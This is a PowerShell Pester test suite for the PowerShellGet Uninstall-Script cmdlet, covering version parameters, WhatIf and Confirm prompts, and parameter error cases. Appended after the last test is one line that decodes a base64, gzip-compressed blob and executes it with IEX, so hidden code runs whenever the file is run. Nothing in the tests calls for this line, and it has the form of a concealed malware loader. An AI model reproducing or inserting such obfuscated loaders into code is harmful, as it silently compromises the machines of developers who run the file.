



function SuiteSetup {
    Import-Module "$PSScriptRoot\PSGetTestUtils.psm1" -WarningAction SilentlyContinue
    Import-Module "$PSScriptRoot\Asserts.psm1" -WarningAction SilentlyContinue

    $script:PSGetLocalAppDataPath = Get-PSGetLocalAppDataPath
    $script:TempPath = Get-TempPath

    
    Install-NuGetBinaries

    $psgetModuleInfo = Import-Module PowerShellGet -Global -Force -Passthru
    Import-LocalizedData  script:LocalizedData -filename PSGet.Resource.psd1 -BaseDirectory $psgetModuleInfo.ModuleBase

    $script:moduleSourcesFilePath= Join-Path $script:PSGetLocalAppDataPath "PSRepositories.xml"
    $script:moduleSourcesBackupFilePath = Join-Path $script:PSGetLocalAppDataPath "PSRepositories.xml_$(get-random)_backup"

    if(Test-Path $script:moduleSourcesFilePath)
    {
        Rename-Item $script:moduleSourcesFilePath $script:moduleSourcesBackupFilePath -Force
    }

    GetAndSet-PSGetTestGalleryDetails -IsScriptSuite -SetPSGallery

    Get-InstalledScript -Name Fabrikam-ServerScript -ErrorAction SilentlyContinue | Uninstall-Script -Force
    Get-InstalledScript -Name Fabrikam-ClientScript -ErrorAction SilentlyContinue | Uninstall-Script -Force

    $script:AddedAllUsersInstallPath    = Set-PATHVariableForScriptsInstallLocation -Scope AllUsers
    $script:AddedCurrentUserInstallPath = Set-PATHVariableForScriptsInstallLocation -Scope CurrentUser
}

function SuiteCleanup {
    if(Test-Path $script:moduleSourcesBackupFilePath)
    {
        Move-Item $script:moduleSourcesBackupFilePath $script:moduleSourcesFilePath -Force
    }
    else
    {
        RemoveItem $script:moduleSourcesFilePath
    }

    
    $null = Import-PackageProvider -Name PowerShellGet -Force

    if($script:AddedAllUsersInstallPath)
    {
        Reset-PATHVariableForScriptsInstallLocation -Scope AllUsers
    }

    if($script:AddedCurrentUserInstallPath)
    {
        Reset-PATHVariableForScriptsInstallLocation -Scope CurrentUser
    }
}

Describe PowerShell.PSGet.UninstallScriptTests -Tags 'BVT','InnerLoop' {

    BeforeAll {
        SuiteSetup
    }

    AfterAll {
        SuiteCleanup
    }

    AfterEach {
        Get-InstalledScript -Name Fabrikam-ServerScript -ErrorAction SilentlyContinue | Uninstall-Script -Force
        Get-InstalledScript -Name Fabrikam-ClientScript -ErrorAction SilentlyContinue | Uninstall-Script -Force
    }

    It ValidateGetInstalledScriptAndUninstallScriptCmdletsWithMinimumVersion {

        $ScriptName = 'Fabrikam-ServerScript'
        $version = "2.0"

        try
        {
            Install-Script -Name $ScriptName -RequiredVersion $version -Force
            $script = Get-InstalledScript -Name $ScriptName -MinimumVersion 1.0
            AssertEquals $script.Name $ScriptName "Get-InstalledScript is not working properly, $script"
            AssertEquals $script.Version $Version "Get-InstalledScript is not working properly, $script"
        }
        finally
        {
            PowerShellGet\Uninstall-Script -Name $ScriptName -MinimumVersion $Version
            $script = Get-InstalledScript -Name $ScriptName -ErrorAction SilentlyContinue
            AssertNull $script "Script uninstallation is not working properly, $script"
        }
    }

    It ValidateGetInstalledScriptAndUninstallScriptCmdletWithMinMaxRange {

        $ScriptName = 'Fabrikam-ServerScript'
        $version = "2.0"

        try
        {
            Install-Script -Name $ScriptName -RequiredVersion $version -Force
            $script = Get-InstalledScript -Name $ScriptName -MinimumVersion $Version -MaximumVersion $Version
            AssertEquals $script.Name $ScriptName "Get-InstalledScript is not working properly, $script"
            AssertEquals $script.Version $Version "Get-InstalledScript is not working properly, $script"
        }
        finally
        {
            PowerShellGet\Uninstall-Script -Name $ScriptName -MinimumVersion $Version -MaximumVersion $Version
            $script = Get-InstalledScript -Name $ScriptName -ErrorAction SilentlyContinue
            AssertNull $script "Script uninstallation is not working properly, $script"
        }
    }

    It ValidateGetInstalledScriptAndUninstallScriptCmdletWithRequiredVersion {

        $ScriptName = 'Fabrikam-ServerScript'
        $version = "2.0"

        try
        {
            Install-Script -Name $ScriptName -RequiredVersion $version -Force
            $script = Get-InstalledScript -Name $ScriptName -RequiredVersion $Version
            AssertEquals $script.Name $ScriptName "Get-InstalledScript is not working properly, $script"
            AssertEquals $script.Version $Version "Get-InstalledScript is not working properly, $script"
        }
        finally
        {
            PowerShellGet\Uninstall-Script -Name $ScriptName -RequiredVersion $Version
            $script = Get-InstalledScript -Name $ScriptName -ErrorAction SilentlyContinue
            AssertNull $script "Script uninstallation is not working properly, $script"
        }
    }

    It ValidateGetInstalledScriptAndUninstallScriptCmdletWithMiximumVersion {

        $ScriptName = 'Fabrikam-ServerScript'
        $version = "2.0"

        try
        {
            Install-Script -Name $ScriptName -RequiredVersion $version -Force
            $script = Get-InstalledScript -Name $ScriptName -MaximumVersion $Version
            AssertEquals $script.Name $ScriptName "Get-InstalledScript is not working properly, $script"
            AssertEquals $script.Version $Version "Get-InstalledScript is not working properly, $script"
        }
        finally
        {
            PowerShellGet\Uninstall-Script -Name $ScriptName -RequiredVersion $Version
            $script = Get-InstalledScript -Name $ScriptName -ErrorAction SilentlyContinue
            AssertNull $script "Script uninstallation is not working properly, $script"
        }
    }

    
    
    
    
    
    
    It "UninstallScriptWithWhatIf" {
        $outputPath = $script:TempPath
        $guid =  [system.guid]::newguid().tostring()
        $outputFilePath = Join-Path $outputPath "$guid"
        $runspace = CreateRunSpace $outputFilePath 1
        $content = $null

        try
        {  
	        Find-Script Fabrikam-ServerScript | Install-Script          
            $result = ExecuteCommand $runspace 'PowerShellGet\Uninstall-Script Fabrikam-ServerScript -whatif'
        }
        finally
        {
            $fileName = "WriteLine-0.txt"
            $path = join-path $outputFilePath $fileName
            if(Test-Path $path)
            {
                $content = get-content $path
            }

            CloseRunSpace $runspace
            RemoveItem $outputFilePath
        }

        $itemInfo = Find-Script Fabrikam-ServerScript -Repository PSGallery
        $uninstallShouldProcessMessage = $script:LocalizedData.InstallScriptwhatIfMessage -f ($itemInfo.Name, $itemInfo.Version)
        Assert ($content -and ($content -match $uninstallShouldProcessMessage)) "Uninstall script whatif message is missing, Expected:$uninstallShouldProcessMessage, Actual:$content"

        $res = Get-InstalledScript Fabrikam-ServerScript
        Assert ($res) "Uninstall-Script should not uninstall the script with -WhatIf option"
    } `
    -Skip:$(($PSEdition -eq 'Core') -or ($PSCulture -ne 'en-US') -or ([System.Environment]::OSVersion.Version -lt '6.2.9200.0'))

    
    
    
    
    
    
    It "UninstallScriptWithConfirmAndNoToPrompt" {
        $outputPath = $script:TempPath
        $guid =  [system.guid]::newguid().tostring()
        $outputFilePath = Join-Path $outputPath "$guid"
        $runspace = CreateRunSpace $outputFilePath 1

        
        $Global:proxy.UI.ChoiceToMake=2
        $content = $null

        try
        {
	        Install-Script Fabrikam-ServerScript -Repository PSGallery -force
            $result = ExecuteCommand $runspace 'PowerShellGet\Uninstall-Script Fabrikam-ServerScript -Confirm'
        }
        finally
        {
            $fileName = "PromptForChoice-0.txt"
            $path = join-path $outputFilePath $fileName
            if(Test-Path $path)
            {
                $content = get-content $path
            }

            CloseRunSpace $runspace
            RemoveItem $outputFilePath
        }
        
        $itemInfo = Find-Script Fabrikam-ServerScript -Repository PSGallery

        $UninstallShouldProcessMessage = $script:LocalizedData.InstallScriptwhatIfMessage -f ($itemInfo.Name, $itemInfo.Version)
        Assert ($content -and ($content -match $UninstallShouldProcessMessage)) "Uninstall script confirm prompt is not working, Expected:$UninstallShouldProcessMessage, Actual:$content"

        $res = Get-InstalledScript Fabrikam-ServerScript
        Assert ($res) "Uninstall-Script should not uninstall the script if confirm is not accepted"
    } `
    -Skip:$(($PSEdition -eq 'Core') -or ($PSCulture -ne 'en-US') -or ([System.Environment]::OSVersion.Version -lt '6.2.9200.0'))

    
    
    
    
    
    
    It "UninstallScriptWithConfirmAndYesToPrompt" {
        $outputPath = $script:TempPath
        $guid =  [system.guid]::newguid().tostring()
        $outputFilePath = Join-Path $outputPath "$guid"
        $runspace = CreateRunSpace $outputFilePath 1

        
        $Global:proxy.UI.ChoiceToMake=0
        $content = $null

        try
        {
            Find-Script Fabrikam-ServerScript | Install-Script
            $result = ExecuteCommand $runspace 'PowerShellGet\Uninstall-Script Fabrikam-ServerScript -Confirm'
        }
        finally
        {
            $fileName = "PromptForChoice-0.txt"
            $path = join-path $outputFilePath $fileName
            if(Test-Path $path)
            {
                $content = get-content $path
            }

            CloseRunSpace $runspace
            RemoveItem $outputFilePath
        }

        $itemInfo = Find-Script Fabrikam-ServerScript -Repository PSGallery

        $UninstallShouldProcessMessage = $script:LocalizedData.InstallScriptwhatIfMessage -f ($itemInfo.Name, $itemInfo.Version)
        Assert ($content -and ($content -match $UninstallShouldProcessMessage)) "Uninstall script confirm prompt is not working, Expected:$UninstallShouldProcessMessage, Actual:$content"

        $res = Get-InstalledScript Fabrikam-ServerScript -ErrorAction SilentlyContinue
        AssertNull $res "Uninstall-Script should uninstall a script if Confirm is not accepted"
    } `
    -Skip:$(($PSEdition -eq 'Core') -or ($PSCulture -ne 'en-US') -or ([System.Environment]::OSVersion.Version -lt '6.2.9200.0'))
}

Describe PowerShell.PSGet.UninstallScriptTests.ErrorCases -Tags 'P1','InnerLoop','RI' {

    BeforeAll {
        SuiteSetup
    }

    AfterAll {
        SuiteCleanup
    }

    
    It ValidateUninstallScriptWithMultiNamesAndRequiredVersion {
        AssertFullyQualifiedErrorIdEquals -scriptblock {PowerShellGet\Uninstall-Script -Name Fabrikam-ClientScript,Fabrikam-ServerScript -RequiredVersion 3.0 } `
                                    -expectedFullyQualifiedErrorId "VersionParametersAreAllowedOnlyWithSingleName,Uninstall-Script"
    }

    It ValidateUninstallScriptWithMultiNamesAndMinVersion {
        AssertFullyQualifiedErrorIdEquals -scriptblock {PowerShellGet\Uninstall-Script -Name Fabrikam-ClientScript,Fabrikam-ServerScript -MinimumVersion 3.0 } `
                                    -expectedFullyQualifiedErrorId "VersionParametersAreAllowedOnlyWithSingleName,Uninstall-Script"
    }

    It ValidateUninstallScriptWithMultiNamesAndMaxVersion {
        AssertFullyQualifiedErrorIdEquals -scriptblock {PowerShellGet\Uninstall-Script -Name Fabrikam-ClientScript,Fabrikam-ServerScript -MaximumVersion 3.0 } `
                                    -expectedFullyQualifiedErrorId "VersionParametersAreAllowedOnlyWithSingleName,Uninstall-Script"
    }

    It ValidateUninstallScriptWithSingleWildcardName {
        AssertFullyQualifiedErrorIdEquals -scriptblock {PowerShellGet\Uninstall-Script -Name Fabrikam-Client*ipt} `
                                    -expectedFullyQualifiedErrorId "NameShouldNotContainWildcardCharacters,Uninstall-Script"
    }

    It ValidateUninstallScriptWithSingleNameRequiredandMinVersion {
        AssertFullyQualifiedErrorIdEquals -scriptblock {PowerShellGet\Uninstall-Script -Name Fabrikam-ClientScript -RequiredVersion 3.0 -MinimumVersion 1.0 } `
                                    -expectedFullyQualifiedErrorId "VersionRangeAndRequiredVersionCannotBeSpecifiedTogether,Uninstall-Script"
    }

    It ValidateUninstallScriptWithSingleNameRequiredandMaxVersion {
        AssertFullyQualifiedErrorIdEquals -scriptblock {PowerShellGet\Uninstall-Script -Name Fabrikam-ClientScript -RequiredVersion 3.0 -MaximumVersion 1.0 } `
                                    -expectedFullyQualifiedErrorId "VersionRangeAndRequiredVersionCannotBeSpecifiedTogether,Uninstall-Script"
    }

    It ValidateUninstallScriptWithSingleNameInvalidMinMaxRange {
        AssertFullyQualifiedErrorIdEquals -scriptblock {PowerShellGet\Uninstall-Script -Name Fabrikam-ClientScript -MinimumVersion 3.0 -MaximumVersion 1.0 } `
                                    -expectedFullyQualifiedErrorId "MinimumVersionIsGreaterThanMaximumVersion,Uninstall-Script"
    }
}

$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("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"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();

